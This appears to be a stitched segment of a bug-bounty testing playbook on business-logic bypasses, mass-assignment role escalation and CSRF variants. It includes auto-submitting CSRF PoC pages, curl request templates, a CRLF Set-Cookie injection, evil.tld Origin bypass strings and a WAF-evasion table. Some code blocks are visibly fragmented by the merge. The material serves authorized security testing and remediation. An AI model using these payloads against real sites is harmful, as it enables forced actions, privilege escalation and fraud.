# general-technique — part 2/45 (98 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] V-14: Business flow evasion through client-side logic interception and response flipping

**Mechanism:** The gate lives in the browser: JS decides "payment verified", "quiz
passed", "age confirmed", "trial active" and only then calls the completion endpoint —
or the server's completion endpoint simply never re-checks. Response flipping (editing
`success:false` → `true` in transit) makes the *client* proceed to a step it should not
reach; the finding exists when the *server* honors the resulting request without its own
prerequisite check (CWE-602 — client-side enforcement of server-side security).

**Preconditions:**
- A flow with client-side branching: SPA/mobile JS gate, inline `if (!verified) return`,
  or a "server said OK" flag the client stores.
- Proxy control (Burp/ZAP) to edit responses and replay follow-ups with curl.
- Map the flow first via `payloads.md` — you need to know what the client waits for.

**Detect:**
1. Trace the flow in the proxy: identify the exact request the client sends *after* its
   gate decides success, and what response the client expects before advancing
   (JSON key, status, redirect).
2. Fail the gated step deliberately (wrong payment reference, failed quiz answer, expired
   trial) and edit the response to the expected success shape; watch what follow-up the
   client now emits — then replay that follow-up **directly with curl** (removing your
   edited client entirely).
3. Direct-step test: skip the proxy games and just call the completion endpoint with the
   prerequisite never performed — if it succeeds, the gate was never server-side (this
   overlaps V-02; the distinguishing marker is there was *no server state machine to
   violate*, only a client branch).
4. Smuggle the verdict: add whatever the client would have attached after its check —
   `verified=true`, `payment_confirmed=1`, a client-computed hash/flag, a header
   (`X-Verified`, `X-Client-Status`) — one at a time.
5. Mobile/JS source: decompile or read the bundle for the expected success schema and
   hidden flags the UI never shows.
6. Re-read server state independently each time — the whole variant hinges on the
   difference between "my browser proceeded" and "the server committed".

**Proof of concept:**
```bash

## [Bugbountyskills.md] 1) In proxy: flip the failed-step response to the success shape, capture the

## [Bugbountyskills.md] follow-up the client then sends, e.g.:

## [Bugbountyskills.md] 2) Replay that follow-up directly — no edited client involved

curl -sS -i -b jar_a.txt -X POST '<TARGET_URL>/api/<COMPLETION_ENDPOINT>' \
  -H 'Content-Type: application/json' \
  -d '{"trial_active":true,"verified":true,"step":"<GATED_STEP>"}'

## [Bugbountyskills.md] 3) Independent readback of the finished flow

curl -sS -b jar_a.txt '<TARGET_URL>/api/<FLOW_OBJECT>?cb=1'
```

**Confirm:** The server-side resource reaches its final state (fresh GET / second
account view) for a flow whose gated step *never actually succeeded* — the proxy flip
only moved your client; the replayed request alone must reproduce it. A pretty UI after
the flip proves nothing.

**False positives:** Flipping the response only fools your browser (server state
unchanged — the replay step is mandatory); flows that legitimately allow the next call
and verify server-side *later* (poll until the queue settles, then re-read before
concluding); the gated step was genuinely optional; your follow-up accidentally included
a real success artifact from elsewhere (trace what each field means in the bundle);
server-side check present but your test missed it (e.g. it validates the *next* step —
probe both directions before claiming either).

**Impact:** "The `<gate>` (payment verification / trial state / quiz / age check) is
enforced only in client code; `<completion endpoint>` finishes the flow without
server-side verification of `<prerequisite>`." Name what the unverified completion yields
(content, subscription, monetary action) — that drives severity.

**Remediation:** Move the gate server-side: the completion endpoint must itself verify
the prerequisite state from authoritative server data, treating every client signal
(including "verified" flags) as display-only input.

**CWE / OWASP:** CWE-602 (Client-Side Enforcement of Server-Side Security) / CWE-603
(Client-Side Enforcement of Authentication); OWASP A04:2021 Insecure Design.

---

## [Bugbountyskills.md] V-15: Insecure ID direct assignment during self-registration elevating roles

**Mechanism:** The registration/upgrade endpoint accepts client-chosen identity and
privilege-adjacent fields — `id`, `user_id`, `role`, `plan`, `tenant_id`, `org_id`,
`verified`, `invited_by` — because the signup body is bound wholesale to the user model.
Attacker assigns a privileged role at creation, or an id that collides with an existing
record (upsert merge/overwrite/hijack). The violated assumption: "identity and role are
assigned by the server at account creation".

**Preconditions:**
- Open self-registration (or an upgrade/plan-change endpoint in the same trust class).
- Body/params not visibly stripped (check the signup request for extra fields the form
  sends — or absent fields the API docs mention).
- A role-gated action to test against, plus a plain-signup control account (both yours).

**Detect:**
1. Capture the signup request; run the *control* first — register a plain account with
   no extra fields and record its default role. Everything is diffed against this.
2. Field injection, one per new account (registration is cheap — one variable each):
   `role=admin`, `is_admin=1`, `plan=enterprise`, `verified=true`, `tenant_id`,
   `org_id`, `user_id`, `invited_by`, `ref`. Never reuse accounts for different probes —
   you cannot attribute otherwise.
3. ID-collision variant: register with `id=<ID_OF_YOUR_TEST_ACCOUNT_B>` (sandbox, your
   own record — **never** an admin/real user beyond the minimal proof). Does the upsert
   merge/overwrite? Does B still log in? Did your new session inherit B's data?
4. Verify elevation with a fresh login + a role-gated action (or the V-04/V-06 chain) —
   the signup response echoing `role: admin` is a lead, not proof.
5. Second-order pass: the client-assigned id now becomes a foreign-key authorization
   reference later (documents, invites, ownership) — that feeds V-12/`bac-idor-testing`.
6. Variant surfaces: plan/upgrade endpoints (`/api/subscription` with `plan=enterprise`),
   invite endpoints (`role=admin` + valid invite), profile update after signup (mass
   assignment on an existing user) — same root cause, different door.

**Proof of concept:**
```bash

## [Bugbountyskills.md] Control: plain signup (default role) — register in a fresh browser/jar

curl -sS -i -c jar_ctrl.txt -X POST '<TARGET_URL>/api/register' \
  -d 'email=<EMAIL_CTRL>&password=<PASSWORD>'

## [Bugbountyskills.md] Independent signal: fresh login, then a role-gated action

curl -sS -i -c jar_probe2.txt -X POST '<TARGET_URL>/login' -d 'email=<EMAIL_PROBE>&password=<PASSWORD>'
curl -sS -i -b jar_probe2.txt -X POST '<TARGET_URL>/api/<ADMIN_ACTION>' -d '{}'
```

**Confirm:** A fresh login as the probe account passes a role-gated check *and* executes
the gated action (state change observed) — while the control account with identical
rights minus the injected field is denied. For the collision variant: the target record's
data or session is demonstrably reachable under your new registration, verified from the
other account's own view.

**False positives:** Field accepted and silently discarded (re-derive role from a fresh
login — echo ≠ persistence); default role already elevated on the test tenant (the
control signup exposes this instantly); "admin" mapped to a role with no actual
permissions (the gated-action step fails — then it's not escalation); SSO tenants where
local signup is dev-only (note environment); account-id collision silently *regenerated*
server-side (check the actual stored id, not the one you sent).

**Impact:** "Self-registration accepts `<field>`; an attacker creates an account with
`<role>` (or assumes `<existing tester-owned id>`) → immediate vertical escalation / record
collision from signup." Name the gated capability reached; for collisions, state whether
existing data changed.

**Remediation:** Assign ids and roles server-side with fixed defaults via a registration
DTO that allow-lists only profile fields; route any role/tenant/plan change through an
authorized, audited path, and reject (never upsert on) client-supplied primary keys.

**CWE / OWASP:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined
Object Attributes) / CWE-284 (Improper Access Control); OWASP A01:2021 Broken Access
Control + A04:2021 Insecure Design.

## [Bugbountyskills.md] Engagement workflow

1. **Recon & endpoint inventory.** Harvest every state-changing request: proxy history,
   sitemap, JS bundles, mobile API specs, GraphQL mutations, WebSocket handshakes.
   Include GET/DELETE with side effects and JSON-only API routes.
   *Why:* CSRF only exists where a request changes state or leaks data cross-origin;
   without the endpoint list you will test only the obvious forms and miss the API.
2. **Defense mapping.** Per endpoint, classify: auth transport (cookies vs bearer
   header), token carriers (body field, custom header, query, double-submit cookie),
   cookie flags (`SameSite`, `Domain`, `Secure`, `__Host-`), Origin/Referer logic,
   Content-Type allow-list, and CORS policy.
   *Why:* each variant is a bet that one specific control is missing or weak — mapping
   tells you which 2-3 variants to run instead of spraying all 18.
3. **Variant selection.** Use the table below: match the signal you actually observed
   to a variant, then read that variant section for the probe sequence.
   *Why:* guessing variants wastes time and produces weak reports; signals narrow the
   search to a single failed assumption.
4. **Safe probe.** Run the least-impact action from your own session first (set a
   display name, timezone, benign preference). Never start with password, email,
   payment, or deletion flows.
   *Why:* you need a working success criterion before involving a victim session, and
   an accidental success on a sensitive action causes real damage and fraud alerts.
5. **Confirmation test.** Reproduce from a real browser on an attacker-controlled
   origin (hosted PoC page), then capture two independent signals: the request
   actually carried the victim session cookie (DevTools/network) and the state change
   persisted server-side (re-fetch as the victim).
   *Why:* curl success does not prove exploitability — SameSite, preflight, and Origin
   rules only exist in browsers, and most false CSRF positives come from ignoring them.
6. **Impact proof.** Document the minimum-impact proof (benign field change visible to
   the victim) plus one line on how the same request class scales (e.g. the same
   endpoint pattern on password/email/order actions).
   *Why:* programs pay for demonstrated impact, and a contained proof is defensible
   while a destructive demo may violate the rules of engagement.
7. **False-positive filter.** Re-run the variant's FP checklist: strip every token
   carrier (body, header, query, both cookies), read response bodies not just status
   codes, use a fresh cookie jar, rule out cached 200s, and reject any bypass that
   only works because curl spoofed a header a browser cannot spoof.
   *Why:* the second, independent signal is what separates a finding from a lead.
8. **Report.** Fill the template below with a self-contained PoC HTML file and a
   redacted request/response pair.
   *Why:* triage can't reproduce your Burp session; the report must stand alone.

## [Bugbountyskills.md] Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| Plain POST with hidden fields changes state, no other check visible | V-01 POST-based CSRF | `references/variants-1.md` |
| GET request mutates state (id + action in query, `<img>`-firable) | V-02 GET-based CSRF | `references/variants-1.md` |
| Session cookie has no `SameSite` or is `Lax`; only navigation vectors remain | V-03 SameSite Lax window | `references/variants-1.md` |
| Cookie is `SameSite=Strict` but you control a sibling/takeover subdomain | V-04 Strict subdomain takeover | `references/variants-1.md` |
| Token rejected on POST but the same action via GET/`_method`/override header passes | V-05 Method-dependent validation | `references/variants-1.md` |
| Removing the token parameter makes the request succeed; value/renames vary | V-06 Omission/deletion/stripping | `references/variants-1.md` |
| Empty `csrf_token=` (or JSON `null`) is accepted where a value is checked | V-07 Blank/null token | `references/variants-1.md` |
| Token captured on one session works for a different logged-in session/user | V-08 Token not session-bound | `references/variants-1.md` |
| Tokens identical across users, sequential, timestamped, or reused forever | V-09 Static/predictable tokens | `references/variants-2.md` |
| Body value alone fails but changing cookie + body together succeeds; `%0d%0a` lands in a header | V-10 Double submit + CRLF | `references/variants-2.md` |
| Only Origin/Referer guards the action; `Origin: null`, stripped Referer, or `x.target.tld.evil.tld` passes | V-11 Referer/Origin bypass | `references/variants-2.md` |
| Token check fires only for urlencoded; `text/plain`/multipart still parsed | V-12 Content-Type manipulation | `references/variants-2.md` |
| JSON endpoint skipped by CSRF middleware, or body sniffed across content types | V-13 JSON/form tunnelling | `references/variants-2.md` |
| Reflected/`null` CORS with credentials, or OPTIONS says allowed while POST differs | V-14 SOP/CORS + preflight mismatch | `references/variants-2.md` |
| `/crossdomain.xml` or `/clientaccesspolicy.xml` served with `*` wildcards | V-15 Flash/crossdomain.xml | `references/variants-2.md` |
| Cookie-authenticated `wss://` endpoint; handshake accepts any `Origin` | V-16 CSWSH | `references/variants-2.md` |
| Token/cookie issued before login, unchanged after login, or supplied by the client | V-17 Pre-auth token injection | `references/variants-2.md` |
| Any XSS or token leak (meta tag + sink, JSONP, postMessage) on the origin | V-18 XSS-assisted CSRF / DOM token theft | `references/variants-2.md` |

## [Bugbountyskills.md] Verification standard

A **confirmed finding** requires all four:

1. **Reproducible request/response pair** — the exact attacker-controlled request
   (headers + body) and the server response, captured from a cross-origin browser PoC
   as well as a scripted replay. Header-spoof-only reproductions from curl are leads,
   not confirmations, unless a browser can genuinely produce that header
   (`Origin: null` via sandboxed iframe can; an arbitrary forged Origin cannot).
2. **Minimal-impact impact proof** — the least-damaging state change that still proves
   cross-site execution, re-read from the victim session afterward.
3. **Every token carrier stripped** — body field, custom header, query string,
   double-submit cookie, and any JS-readable cookie, all removed or neutralized in
   separate attempts (V-06/V-07/V-10 each fail differently).
4. **Browser-realistic conditions** — real browser, fresh profile, cookies attached as
   SameSite rules dictate, preflight observed or absent as expected, response *body*
   checked (a 200 with an error JSON is not a success).

A **lead** is anything short of that: curl-only success, status-code-only evidence,
"token looks weak" without a forged acceptance, or CORS permissiveness without
demonstrated cross-origin readability or state change.

## [Bugbountyskills.md] Reference pointers

Read `references/variants-1.md` for variants 1-8 and `references/variants-2.md` for
variants 9-18; read `references/payloads.md` when you need request templates, tool
commands, or WAF-evasion encodings. Do not improvise payloads in SKILL.md — the
playbook detail, probe sequences, and false-positive gotchas live in the reference
files.

## [Bugbountyskills.md] Table of contents

- [Minimal HTML form PoC](#minimal-html-form-poc)
- [fetch / XHR PoC (no-cors + credentials)](#fetch--xhr-poc-no-cors--credentials)
- [GET trigger templates (img / script / navigation)](#get-trigger-templates-img--script--navigation)
- [Tunnelling note: text/plain and application/json](#tunnelling-note-textplain-and-applicationjson)
- [curl replay template (own session confirmation)](#curl-replay-template-own-session-confirmation)
- [WAF evasion: encodings and obfuscations](#waf-evasion-encodings-and-obfuscations)
- [Tool invocation templates](#tool-invocation-templates)
- [Chain it with](#chain-it-with)

## [Bugbountyskills.md] Minimal HTML form PoC

Auto-submitting cross-origin form — the V-01/V-03/V-04 workhorse. Works for any
urlencoded/multipart endpoint; the browser attaches the victim's session cookie
subject to SameSite rules (V-03), and every hidden value is attacker-chosen (V-01).

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>Loading…</h1>
<!-- Minimal form PoC template -->
<form id="csrf" method="POST" action="https://<TARGET_HOST>/<STATE_CHANGING_PATH>"
      enctype="application/x-www-form-urlencoded">
  <!-- business params the UI never exposes go here -->
  <input type="hidden" name="<BUSINESS_PARAM>" value="<ATTACKER_VALUE>">
  <input type="hidden" name="<OTHER_PARAM>" value="<VALUE>">
  <!-- only if the token is intentionally omitted/blank for V-06/V-07:
  <input type="hidden" name="csrf_token" value=""> -->
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Notes:
- For multipart-only targets, add `enctype="multipart/form-data"` — still a CORS
  simple request, no preflight (V-12).
- For the Chrome Lax-allow-unsafe 2-minute window (V-03), the victim must log in and
  open this page immediately; wrap submission in `setTimeout(..., 0)` and document the
  window in your repro steps.
- Do not auto-submit on sensitive flows (password/email/payment) — swap in a benign
  field (display name, timezone) per the workflow's safe-probe rule.

## [Bugbountyskills.md] GET trigger templates (img / script / navigation)

For state-changing safe methods (V-02) and method-mutation probes (V-05). Only fires
when the cookie rides the vector: subresource loads need `SameSite=None`; top-level
navigation also works with Lax.

```html
<!-- subresource vectors -->
<img src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>" width="0" height="0" alt="">
<script src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>"></script>
<link rel="prefetch" href="https://<TARGET_HOST>/<PATH>?<PARAM>=<VALUE>">

<!-- top-level navigation vector (works with SameSite=Lax) -->
<script>location.href = "https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>";</script>
<!-- or meta refresh: <meta http-equiv="refresh" content="0;url=https://<HOST>/<PATH>?<PARAM>=<VALUE>"> -->
```

Caveats: `<script src>` only "succeeds" as a side channel if the endpoint mutates on
GET (otherwise it just fails to parse — check state server-side, not the tag);
`<img>`/`<script>` are cross-site subresource requests, so a Lax cookie will **not**
be attached (V-03/V-02 preconditions); `<form method="GET">` auto-submit also lands
in the top-level case.

## [Bugbountyskills.md] Tunnelling note: text/plain and application/json

- `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain` are
  CORS **simple** content types → the browser sends them cross-origin **without a
  preflight**. `application/json` is not simple → always triggers `OPTIONS`
  (V-13/V-14 decide whether that preflight passes).
- The JSON-over-simple-request trick (V-12/V-13): send a JSON *string* as the body
  with `Content-Type: text/plain`:

  ```js
  fetch('https://<TARGET_HOST>/<API_PATH>', {
    method: 'POST', mode: 'no-cors', credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ '<BUSINESS_PARAM>': '<VALUE>' })
  });
  ```

  This works only if the server type-sniffs or its parser accepts wildcards
  (`express.json({type:'*/*'})`, Laravel `Request::json()`, Rails format sniffing) —
  probe with the V-13 matrix before assuming.
- Reverse direction: some form endpoints deserialize `application/json` bodies —
  test both representations on the same path (V-13 matrix).
- Legitimate `application/json` POST from a browser page is *also* possible when the
  server's preflight allows your origin — that outcome belongs to V-14: record the
  `OPTIONS` verdict and the actual response separately, they can disagree.
- Multipart note (V-12): crafting multipart by hand needs a boundary; in curl use
  `-F 'name=value'` and let curl build headers.

## [Bugbountyskills.md] 2) variant matrix — change ONE thing per run, log status + body + side effect

## [Bugbountyskills.md] d) Origin null            → -H 'Origin: null'

## [Bugbountyskills.md] e) Origin regex-buster    → -H 'Origin: https://<TARGET_HOST>.evil.tld'

## [Bugbountyskills.md] f) no Origin/Referer      → delete both header lines

## [Bugbountyskills.md] g) method mutation        → -X GET with params in the query string

## [Bugbountyskills.md] h) CT reshaping           → -H 'Content-Type: text/plain' / -F 'a=b' (multipart)

## [Bugbountyskills.md] WAF evasion: encodings and obfuscations

Apply to the *body/URL* of the PoC when a WAF blocks the plain payload. WAF evasion
does not change the vulnerability — it changes whether your probe reaches origin.

| Technique | Example | When it helps |
|---|---|---|
| HTML entity encoding of field values | `value="&#x61;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x72;"` | WAF signatures scan HTML PoC pages / stored reflected fields |
| Comment/whitespace insertion in JS PoC | `doc/**/.getElementById('f').submit()` | Breaks naive script-signature matches on inline PoCs |
| URL-encoding of parameter names | `%63srf_token=...` | PHP-style stacks decode names before lookup; naive WAF matches raw `csrf_token` only |
| Case variation of header names | `X-Csrf-Token` vs `x-csrf-token` | Header-name signatures are case-sensitive in some rulesets (values must keep server-expected case) |
| Param name permutation | `csrf`, `_csrf`, `xsrf`, `_token`, `authenticity_token`, `csrfmiddlewaretoken` | Framework accept-lists cover several names while the WAF signs on one |
| Parameter pollution | `csrf_token=<LEGIT>&csrf_token=stripped` | Last/first-wins parsers (PHP, some proxies) read a different half than the WAF validated |
| Multipart wrapping of urlencoded fields | `-F 'param=value'` boundary body | WAF signs `application/x-www-form-urlencoded` bodies only (V-12) |
| `text/plain` body with urlencoded/JSON content | `Content-Type: text/plain` + same bytes | Simple CT both evades body-signing and skips preflight (V-12/V-13) |
| JSON key/value whitespace + newlines | `{\n  "<PARAM>": "<VALUE>"\n}` | Literal-string JSON signatures; still parsed by origin |
| JSON unicode escapes in values | `"\u0061\u0074\u0074"` | Value-signatures on strings the parser unescapes |
| Method override headers | `X-HTTP-Method-Override: PUT`, body `_method=PUT` | Method-scoped WAF rules (POST-only) + stack honors override (V-05) |
| Split GET into chunked/partial refs | `/?a=1` + separate `&b=2` via `<form method="GET">` | URL-length/single-packet signatures on long query strings |
| Origin/Referer shape variants | `Origin: null`, sandboxed iframe, `Referrer-Policy: no-referrer` | Origin-allowlist and Referer-signature rules (V-11) — this is a *logic* bypass, not just encoding |

Sanity rule: if the evasion only works because your tool sends something a browser
never would, it is a lead (V-11 FP rule) — retest the winning shape from a real
browser page before reporting.

## [Bugbountyskills.md] V-14 preflight vs actual, side by side

curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' | grep -iE 'HTTP/|access-control'
curl -sS -i -X POST 'https://<TARGET_HOST>/<API>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  --data '<PARAM>=<VALUE>' | grep -iE 'HTTP/|access-control'

## [Bugbountyskills.md] V-15 policy fetch

curl -sS -D - 'https://<TARGET_HOST>/crossdomain.xml'
curl -sS -D - 'https://<TARGET_HOST>/clientaccesspolicy.xml'
```

In-browser confirmation (the verdict that matters for browser-only controls): serve
the PoC page from `https://<ATTACKER_ORIGIN>/poc.html`, open it in a clean profile
with the victim session logged in, and inspect the network panel for cookie
attachment + preflight + response — then re-fetch the target as the victim to confirm
the persisted state change.

## [Bugbountyskills.md] Chain it with

- **`xss-testing`** — XSS-assisted CSRF and DOM-based token theft (V-18): any
  same-origin script defeats tokens entirely; use its payload set for the read
  primitive (meta-tag token harvesting, `postMessage` leaks, JSONP/CORS-readable
  token endpoints) and report the root cause as XSS with CSRF as the impact when
  script execution is the driver.
- **`bac-idor-testing`** — privilege implications (V-01/V-08/V-17): a CSRF proof
  only shows *forced action*; broken access control decides whether that action can
  target other users' objects or escalate role (`user_id`/`role` tampering in the
  forged body, mass assignment on the same endpoint). Chain "attacker forges request"
  with "endpoint accepts cross-object parameters" for the real severity.
- **`business-logic-testing`** — CSRF against workflow steps (multi-stage transfers,
  OTP/verification flows) and race + CSRF combinations where one forged step breaks
  the workflow invariant (V-01/V-17 login-adjacent chains).
- **`info-disclosure-testing`** — token/secret leaks that enable CSRF: tokens in
  URLs landing in `Referer`, `.env`/sourcemaps exposing token-generation logic, and
  verbose errors that reveal validation order (V-07/V-09/V-11 reconnaissance).
- **`ssrf-testing` / `rce-testing`** — CSRF on admin-configurable sinks (webhook/URL fields,
  import endpoints) that turns forced configuration into blind SSRF (`ssrf-testing`)
  or a second-order RCE (`rce-testing`) (severity multiplier on V-01).
- **`sqli-testing`** — forged requests carrying injected parameters into
  SQL-backed actions; often the CSRF report is the delivery vehicle while SQLi is
  the impact.
- **`path-traversal-testing`** — CSRF on file/delete/import operations combined with
  traversal in filename parameters (V-01 body-tampering overlap).
- **`sandbox-escape-testing`** — when the CSRF target is an admin action operating
  on a sandboxed worker/runtime, chain the forced action to the sandbox's escape
  primitive for full-impact demonstration.

## [Bugbountyskills.md] Table of contents

- [V-01: POST-based CSRF with hidden form parameter tampering](#v-01-post-based-csrf-with-hidden-form-parameter-tampering)
- [V-02: GET-based CSRF via cross-origin embedded resource traversal](#v-02-get-based-csrf-via-cross-origin-embedded-resource-traversal)
- [V-03: SameSite cookie restrictions and the Lax top-level navigation window](#v-03-samesite-cookie-restrictions-and-the-lax-top-level-navigation-window)
- [V-04: SameSite Strict subdomain takeover cross-context execution](#v-04-samesite-strict-subdomain-takeover-cross-context-execution)
- [V-05: Method-dependent token validation and POST to GET mutation](#v-05-method-dependent-token-validation-and-post-to-get-mutation)
- [V-06: Token omission, deletion and stripping](#v-06-token-omission-deletion-and-stripping)
- [V-07: Blank or null CSRF token acceptance](#v-07-blank-or-null-csrf-token-acceptance)
- [V-08: CSRF token not tied to the user session](#v-08-csrf-token-not-tied-to-the-user-session)

---

## [Bugbountyskills.md] V-03: SameSite cookie restrictions and the Lax top-level navigation window

**Also known as:** classic "SameSite cookie restrictions" + "SameSite cookie restriction bypass" (folded) / v2.1 "SameSite cookie restriction evasion via top-level LaxAllowingUnsafe navigation window".
**Mechanism:** SameSite decides whether the cookie rides a cross-site request at all. Unset = `Lax` in every modern browser: cookies go only on **top-level navigations with safe methods**, plus Chrome's "Lax allow unsafe" quirk — a top-level POST navigation within ~2 minutes of cookie set also carries it. `None; Secure` allows everything; `Strict` blocks all cross-site (→ V-04). Violated assumption: "no token = trivially CSRF-able."

**Preconditions:**
- Cookie `SameSite=Lax`/unset (top-level vectors) or `None; Secure` (any vector).
- For the unsafe-POST window: login that set the cookie happened < ~2 minutes before the victim opens the attacker page (Chrome; window starts at cookie write).
- Endpoint unguarded by token/Origin (otherwise see V-05..V-14).

**Detect:**
1. Inventory `Set-Cookie`: `SameSite` value/absence, `Secure`, `Domain`, lifetime; absent `SameSite` = Lax default in current Chrome/Safari/Firefox.
2. Classify viable vectors per value: Lax → top-level GET nav always, top-level POST nav only inside the ~2-minute window; None → subresource + fetch/XHR; Strict → nothing cross-site (go to V-04).
3. Probe in a real browser from an attacker origin and watch DevTools: *is the cookie in the outgoing request?* That observation is the test — the response code is not.
4. Script "login → open attacker page → auto-POST" for the window, then repeat after 5 minutes to watch the window close (documents the constraint honestly).

**Proof of concept:**
```html
<form id="f" method="POST" action="https://<TARGET_HOST>/<PATH>">
  <input type="hidden" name="<PARAM>" value="<VALUE>"></form>
<script>document.getElementById('f').submit();</script><!-- victim logs in, then opens page within ~2 min -->
```
Lax-safe variant: `<script>location="https://<HOST>/<GET_PATH>?<PARAM>=<VALUE>"</script>`

**Confirm:** (a) DevTools evidence the cookie was attached cross-site under the claimed vector, (b) persisted state change re-fetched as the victim; re-run after the window closes to show which condition you are actually claiming.

**False positives:** curl/Repeater success with a hand-attached cookie (SameSite is browser-enforced only — curl proves nothing about exploitability); tests inside an `<iframe>` (frame navigation is not top-level, so Lax cookies are not sent — the most common self-inflicted dead end); claiming one browser's window for all browsers (Safari/Firefox don't implement the unsafe POST window identically — scope the claim to what you tested); a `Domain=`-scoped cookie appearing on sibling hosts (same-site → that is V-04); an `http://` attacker page vs `https://` target (schemeful same-site makes them cross-site).

**Impact:** frames exploitability of every other variant here — "no token + Lax" reduces to navigation-shaped payloads (V-02/V-05) plus time-windowed POSTs; report the concrete vector you proved, never "SameSite is bypassable" in general.

**Remediation:** keep token/Origin validation as the primary control — SameSite is defense-in-depth only; set `Strict` where UX allows or `None; Secure` deliberately, and shorten cookie lifetime to shrink the unsafe window.

**CWE / OWASP:** CWE-352, CWE-1275 (Sensitive Cookie with Improper SameSite Attribute); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] Table of contents

- [V-09: Static or predictable CSRF tokens](#v-09-static-or-predictable-csrf-tokens)
- [V-10: Double submit cookie bypass with CRLF response splitting](#v-10-double-submit-cookie-bypass-with-crlf-response-splitting)
- [V-11: Referer and Origin validation bypass via stripping and loose regex](#v-11-referer-and-origin-validation-bypass-via-stripping-and-loose-regex)
- [V-12: Content-Type manipulation and multipart reshaping](#v-12-content-type-manipulation-and-multipart-reshaping)
- [V-13: JSON and form tunnelling with parser flexibility](#v-13-json-and-form-tunnelling-with-parser-flexibility)
- [V-14: SOP and CORS misconfiguration bypass with preflight mismatch](#v-14-sop-and-cors-misconfiguration-bypass-with-preflight-mismatch)
- [V-15: Flash based CSRF and crossdomain.xml policy hijacking](#v-15-flash-based-csrf-and-crossdomainxml-policy-hijacking)
- [V-16: Cross Site WebSocket Hijacking](#v-16-cross-site-websocket-hijacking)
- [V-17: Pre auth CSRF token injection and authentication fixation](#v-17-pre-auth-csrf-token-injection-and-authentication-fixation)
- [V-18: XSS assisted CSRF and DOM based token theft](#v-18-xss-assisted-csrf-and-dom-based-token-theft)

---

## [Bugbountyskills.md] V-10: Double submit cookie bypass with CRLF response splitting

**Also known as:** classic "Double submit cookie bypass" / v2.1 "State-separated double submit cookie matching bypass via CRLF injection response splitting".
**Mechanism:** double-submit treats "client sent cookie X and body value X" as proof, but both halves are attacker-controllable — cookie tossing from a sibling subdomain (`document.cookie="csrf=x; domain=.example.com"`) or CRLF/header injection planting the cookie (`%0d%0aSet-Cookie:%20csrf=x`). With both halves forged, the check proves nothing. Violated assumption: "only the server can set a cookie the request will match."

**Preconditions:**
- App relies on a mirrored cookie (`csrf`, `XSRF-TOKEN`, `csrf_token` cookie read client-side — Angular, Rails, Django REST, Laravel are the usual suspects) with no `__Host-` prefix and `Path=/`.
- A tossing point (sibling subdomain with JS write) **or** a CRLF sink: input reflected into `Location`, `Set-Cookie`, or any header without encoding (redirect targets, filenames, `X-Forwarded-Host` link building).
- Planted cookie must actually be *sent*: freshly tossed default-Lax cookies will not ride a cross-site POST — needs `SameSite=None; Secure` or a same-site vector (V-04).

**Detect:**
1. Confirm the design: body token alone → 403, but cookie + body *together* at any value → 200. That proves no server-side secret exists (isolates from V-08/V-09).
2. Hunt CRLF: `%0d%0a`, `%0d`, `\r\n` into redirect params, filenames, header echoes — look for split responses (second `Set-Cookie`, smuggled `X-` header) and attacker-controlled URLs in outgoing links.
3. Hunt tossing: subdomains with JS write capability; verify the target cookie's `Domain`/`Path` coverage.
4. Chain: plant `csrf=<ATTACKER_VALUE>`, then run the V-01 form with the same value in the body.

**Proof of concept:**
```bash
curl -sS -b 'csrf=<ATTACKER_VALUE>; session=<VICTIM_COOKIE>' -X POST \
  'https://<TARGET_HOST>/<PATH>' --data 'csrf=<ATTACKER_VALUE>&<PARAM>=<VALUE>'
curl -sS -D - 'https://<TARGET_HOST>/<REDIRECT_PARAM>=%0d%0aSet-Cookie:%20csrf=<ATTACKER_VALUE>'
```

**Confirm:** a value the server *never issued* yet accepts (split response showing your planted `Set-Cookie`, or a cookie set from the attacker subdomain) **and** the state change under that forged pair from a cross-origin page — pair both legs in one report.

**False positives:** "changed both halves and it worked" while a server-side token check you left intact still guarded it — strip every other carrier (V-06 list) first; CRLF reflecting only into the *body* (that is XSS-adjacent, not response splitting — verify with raw `-D` headers); tossed cookie that never appears in the outgoing cookie list (Lax, wrong Path, `__Host-` prefix); `XSRF-TOKEN` being only UX convenience while a real header check exists.

**Impact:** complete token bypass with zero server knowledge; the CRLF leg is usually a second, higher-severity finding (response splitting → cache poisoning, `Set-Cookie` fixation) — report both legs and how they combine.

**Remediation:** use server-side or HMAC-signed `__Host-`-prefixed tokens with constant-time comparison, and percent-encode CR/LF before any user value is written into a response header.

**CWE / OWASP:** CWE-352, CWE-113 (HTTP Response Splitting), CWE-565; OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] V-11: Referer and Origin validation bypass via stripping and loose regex

**Also known as:** classic "Referer/Origin header stripping" / v2.1 "Referer and Origin header validation bypass via loose and non-anchored regex evaluation".
**Mechanism:** the only defense parses `Origin`/`Referer` with a rule an attacker satisfies — accept-when-missing (strippable via `Referrer-Policy: no-referrer`, sandboxed/`data:` contexts sending `Origin: null`, HTTPS→HTTP downgrade) or an unanchored match (`re.search("target.tld")` hits `nottarget.tld`; `.*target.tld.*` hits `target.tld.evil.tld`). Violated assumption: "the header identifies the caller."

**Preconditions:**
- Origin/Referer is the *sole* control (run V-06 first — with a live token, a header bypass alone is usually not the finding).
- A strippable path (Referer-only checks are strippable; browsers send `Origin` on form POSTs and JSON, but not on navigation GETs) or an unanchored/contains/`endsWith` matcher.

**Detect:**
1. Map the rule black-box, one variable per request (status+body+side effect): `Origin` absent · `Origin: null` · `https://evil.tld` · `https://<TARGET>.evil.tld` · `https://evil.tld/?<TARGET>` · `nottarget.tld` (contains match) · `http` vs `https` · `:443` vs `:8080` · trailing slash/case.
